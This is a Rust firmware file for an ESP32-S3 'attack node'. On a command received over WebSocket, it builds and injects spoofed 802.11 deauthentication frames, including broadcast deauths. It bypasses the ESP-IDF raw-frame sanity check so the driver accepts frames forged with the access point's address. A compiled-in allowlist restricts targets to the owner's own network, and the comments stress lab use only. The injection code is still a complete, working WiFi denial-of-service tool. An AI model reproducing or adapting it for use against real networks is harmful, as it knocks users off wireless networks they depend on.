//! Node3 — Lab attack tester (OWN NETWORK ONLY), ESP32-S3.
//!
//! Joins WiFi as a station, dials the backend over a WebSocket, and on an `attack`
//! command injects raw 802.11 deauthentication frames — but ONLY against a BSSID on
//! the compiled-in `OWN_BSSID` allowlist. A green WS2812 LED identifies this node
//! (heartbeat) and flashes bright green on each transmitted attack.
//!
//! Safety: every TX is gated twice — the backend SafetyGate refuses attack commands
//! unless lab mode is on + confirm_own_net + BSSID allowlisted, and this firmware
//! independently refuses any BSSID not in OWN_BSSID. Deauthing networks you do not
//! own is illegal. See ../../SAFETY.md.
//!
//! Compile-time config (set via .wifi.env + flash-node3.sh):
//!   WIFI_SSID, WIFI_PASSWORD  — your lab network
//!   OWN_BSSID                 — your AP's MAC, the only allowed target (aa:bb:..)
//!   WS_URL                    — backend WS, e.g. ws://172.16.200.52:8080/ws/node/node3

use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::mpsc;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

use esp_idf_svc::eventloop::EspSystemEventLoop;
use esp_idf_svc::hal::peripherals::Peripherals;
use esp_idf_svc::hal::rmt::config::TransmitConfig;
use esp_idf_svc::hal::rmt::{FixedLengthSignal, PinState, Pulse, TxRmtDriver};
use esp_idf_svc::nvs::EspDefaultNvsPartition;
use esp_idf_svc::sys::{
    esp_wifi_80211_tx, wifi_interface_t_WIFI_IF_STA,
};
use esp_idf_svc::wifi::{AuthMethod, BlockingWifi, ClientConfiguration, Configuration, EspWifi};
use esp_idf_svc::ws::client::{EspWebSocketClient, EspWebSocketClientConfig, WebSocketEventType};
use esp_idf_svc::ws::FrameType;

/// Compile-time config, baked from the environment (see flash-node3.sh).
const WIFI_SSID: Option<&str> = option_env!("WIFI_SSID");
const WIFI_PASSWORD: Option<&str> = option_env!("WIFI_PASSWORD");
const OWN_BSSID_STR: Option<&str> = option_env!("OWN_BSSID");
const WS_URL: &str = match option_env!("WS_URL") {
    Some(u) => u,
    None => "ws://172.16.200.52:8080/ws/node/node3",
};

/// Overriding this internal ESP-IDF symbol disables the raw-frame sanity check so
/// `esp_wifi_80211_tx` will transmit deauth frames whose source is the AP's BSSID
/// (not our station MAC). Without it the driver rejects the injection. This is what
/// makes Node3 an attack node — hence the strict own-network allowlist above it.
#[no_mangle]
pub extern "C" fn ieee80211_raw_frame_sanity_check(_arg1: i32, _arg2: i32, _arg3: i32) -> i32 {
    0
}

/// A parsed attack request handed from the WS callback to the main worker.
#[derive(Clone, Copy)]
struct AttackReq {
    bssid: [u8; 6],
    client: [u8; 6], // FF.. = broadcast deauth
}

static CMD_TX: OnceLock<Mutex<mpsc::SyncSender<AttackReq>>> = OnceLock::new();
static ATTACKS_SENT: AtomicU32 = AtomicU32::new(0);

fn main() -> anyhow::Result<()> {
    esp_idf_svc::sys::link_patches();
    esp_idf_svc::log::EspLogger::initialize_default();
    log::warn!("node3-attacker starting: LAB attacks, OWN NETWORK ONLY");

    let peripherals = Peripherals::take()?;

    // --- Green identify LED (WS2812) ---
    let mut led = TxRmtDriver::new(
        peripherals.rmt.channel0,
        peripherals.pins.gpio48,
        &TransmitConfig::new().clock_divider(1),
    )?;
    set_led(&mut led, 0, 0, 0);

    // --- WiFi station: join the lab network ---
    let sysloop = EspSystemEventLoop::take()?;
    let nvs = EspDefaultNvsPartition::take()?;
    let mut wifi = BlockingWifi::wrap(
        EspWifi::new(peripherals.modem, sysloop.clone(), Some(nvs))?,
        sysloop,
    )?;

    let ssid = WIFI_SSID.unwrap_or("");
    let pass = WIFI_PASSWORD.unwrap_or("");
    if ssid.is_empty() {
        log::error!("no WIFI_SSID baked in — set it in .wifi.env and reflash");
    }
    let auth = if pass.is_empty() {
        AuthMethod::None
    } else {
        AuthMethod::WPA2Personal
    };
    wifi.set_configuration(&Configuration::Client(ClientConfiguration {
        ssid: ssid.try_into().unwrap_or_default(),
        password: pass.try_into().unwrap_or_default(),
        auth_method: auth,
        ..Default::default()
    }))?;
    wifi.start()?;
    log::info!("connecting to WiFi '{ssid}' ...");
    // Green "connecting" pulse loop until associated + IP up.
    loop {
        match wifi.connect().and_then(|_| wifi.wait_netif_up()) {
            Ok(_) => break,
            Err(e) => {
                log::warn!("wifi connect retry: {e}");
                blink_once(&mut led, 0, 60, 0, 200); // amber-ish? keep green dim
                std::thread::sleep(Duration::from_millis(800));
            }
        }
    }
    let ip = wifi.wifi().sta_netif().get_ip_info()?;
    log::info!("WiFi up, IP {:?}", ip.ip);

    // --- Own-network allowlist (compiled in) ---
    let own = OWN_BSSID_STR.and_then(parse_mac);
    if own.is_none() {
        log::error!("no valid OWN_BSSID baked in — all attacks will be refused");
    }

    // --- Command queue (WS callback → worker) ---
    let (tx, rx) = mpsc::sync_channel::<AttackReq>(16);
    let _ = CMD_TX.set(Mutex::new(tx));

    // Reconnect loop: deauth against our own AP often drops STA/WS; keep redialing.
    loop {
        if let Err(e) = run_ws_session(&mut led, &rx, own) {
            log::warn!("websocket session ended: {e}");
        }
        blink_once(&mut led, 0, 60, 0, 150);
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn run_ws_session(
    led: &mut TxRmtDriver<'_>,
    rx: &mpsc::Receiver<AttackReq>,
    own: Option<[u8; 6]>,
) -> anyhow::Result<()> {
    let ws_config = EspWebSocketClientConfig::default();
    let mut client = EspWebSocketClient::new(
        WS_URL,
        &ws_config,
        Duration::from_secs(10),
        move |event| {
            if let Ok(ev) = event {
                if let WebSocketEventType::Text(txt) = ev.event_type {
                    handle_command(txt);
                }
            }
        },
    )?;
    log::info!("websocket dialing {WS_URL}");

    let start = Instant::now();
    let mut led_on = false;
    let mut last_blink = 0u64;
    let mut flash_until = 0u64;
    let mut hello_sent = false;
    let mut saw_connected = false;
    let session_start = Instant::now();

    loop {
        let now_ms = start.elapsed().as_millis() as u64;

        if client.is_connected() {
            saw_connected = true;
            if !hello_sent {
                let _ = client.send(
                    FrameType::Text(false),
                    b"{\"ev\":\"log\",\"level\":\"info\",\"msg\":\"node3 online\"}",
                );
                hello_sent = true;
            }
        } else if saw_connected {
            anyhow::bail!("websocket disconnected");
        } else if session_start.elapsed() > Duration::from_secs(15) {
            anyhow::bail!("websocket connect timeout");
        }

        while let Ok(req) = rx.try_recv() {
            if own == Some(req.bssid) {
                send_deauth(&req.bssid, &req.client);
                ATTACKS_SENT.fetch_add(1, Ordering::Relaxed);
                flash_until = now_ms + 500;
                let _ = client.send(
                    FrameType::Text(false),
                    b"{\"ev\":\"log\",\"level\":\"warn\",\"msg\":\"deauth transmitted to own AP\"}",
                );
            } else {
                let _ = client.send(
                    FrameType::Text(false),
                    b"{\"ev\":\"log\",\"level\":\"error\",\"msg\":\"attack refused: target not in OWN_BSSID allowlist\"}",
                );
            }
        }

        // Green LED: bright flash during an attack, else a gentle heartbeat.
        if now_ms < flash_until {
            set_led(led, 0, 255, 0); // full green
        } else if now_ms.saturating_sub(last_blink) >= 500 {
            last_blink = now_ms;
            led_on = !led_on;
            if led_on {
                set_led(led, 0, 40, 0); // dim green
            } else {
                set_led(led, 0, 0, 0);
            }
        }

        std::thread::sleep(Duration::from_millis(20));
    }
}

/// Parse a text command from the backend WS and, if it's an allowed attack request,
/// forward it to the worker. Runs in the WS event task, so it only parses + queues.
fn handle_command(txt: &str) {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(txt) else {
        return;
    };
    if v.get("cmd").and_then(|c| c.as_str()) != Some("attack") {
        return;
    }
    // The backend safety gate has already validated lab mode + confirm_own_net +
    // allowlist before forwarding; we re-check the BSSID against firmware allowlist.
    let bssid = v.get("bssid").and_then(|b| b.as_str()).and_then(parse_mac);
    let Some(bssid) = bssid else { return };
    let client = v
        .get("client")
        .and_then(|c| c.as_str())
        .and_then(parse_mac)
        .unwrap_or([0xFF; 6]); // default broadcast deauth
    if let Some(tx) = CMD_TX.get() {
        if let Ok(tx) = tx.lock() {
            let _ = tx.try_send(AttackReq { bssid, client });
        }
    }
}

/// Build and transmit an 802.11 deauthentication frame.
fn send_deauth(bssid: &[u8; 6], target: &[u8; 6]) {
    let mut frame = [0u8; 26];
    frame[0] = 0xC0; // type=mgmt, subtype=deauth
    frame[1] = 0x00;
    // duration (2) = 0
    frame[4..10].copy_from_slice(target); // addr1 = destination
    frame[10..16].copy_from_slice(bssid); // addr2 = source (spoof AP)
    frame[16..22].copy_from_slice(bssid); // addr3 = BSSID
    // seq (2) = 0
    frame[24] = 0x07; // reason code 7 (class-3 frame from nonassociated STA)
    frame[25] = 0x00;
    unsafe {
        let _ = esp_wifi_80211_tx(
            wifi_interface_t_WIFI_IF_STA,
            frame.as_ptr() as *const core::ffi::c_void,
            frame.len() as i32,
            true,
        );
    }
}

/// Parse "aa:bb:cc:dd:ee:ff" (any separator) into 6 bytes.
fn parse_mac(s: &str) -> Option<[u8; 6]> {
    let hex: String = s.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    if hex.len() != 12 {
        return None;
    }
    let mut mac = [0u8; 6];
    for i in 0..6 {
        mac[i] = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(mac)
}

/// Write one color to the WS2812 via RMT. Args are (r,g,b); WS2812 wants GRB order.
fn set_led(led: &mut TxRmtDriver, r: u8, g: u8, b: u8) {
    let color: u32 = ((g as u32) << 16) | ((r as u32) << 8) | (b as u32);
    let ticks_hz = match led.counter_clock() {
        Ok(h) => h,
        Err(_) => return,
    };
    let t0h = Pulse::new_with_duration(ticks_hz, PinState::High, &Duration::from_nanos(350));
    let t0l = Pulse::new_with_duration(ticks_hz, PinState::Low, &Duration::from_nanos(800));
    let t1h = Pulse::new_with_duration(ticks_hz, PinState::High, &Duration::from_nanos(700));
    let t1l = Pulse::new_with_duration(ticks_hz, PinState::Low, &Duration::from_nanos(600));
    let (t0h, t0l, t1h, t1l) = match (t0h, t0l, t1h, t1l) {
        (Ok(a), Ok(b), Ok(c), Ok(d)) => (a, b, c, d),
        _ => return,
    };
    let mut signal = FixedLengthSignal::<24>::new();
    for i in 0..24 {
        let bit = (color >> (23 - i)) & 1 == 1;
        let (high, low) = if bit { (t1h, t1l) } else { (t0h, t0l) };
        if signal.set(i, &(high, low)).is_err() {
            return;
        }
    }
    let _ = led.start_blocking(&signal);
}

/// Blink the LED once (used during WiFi connect retries).
fn blink_once(led: &mut TxRmtDriver, r: u8, g: u8, b: u8, ms: u64) {
    set_led(led, r, g, b);
    std::thread::sleep(Duration::from_millis(ms));
    set_led(led, 0, 0, 0);
}
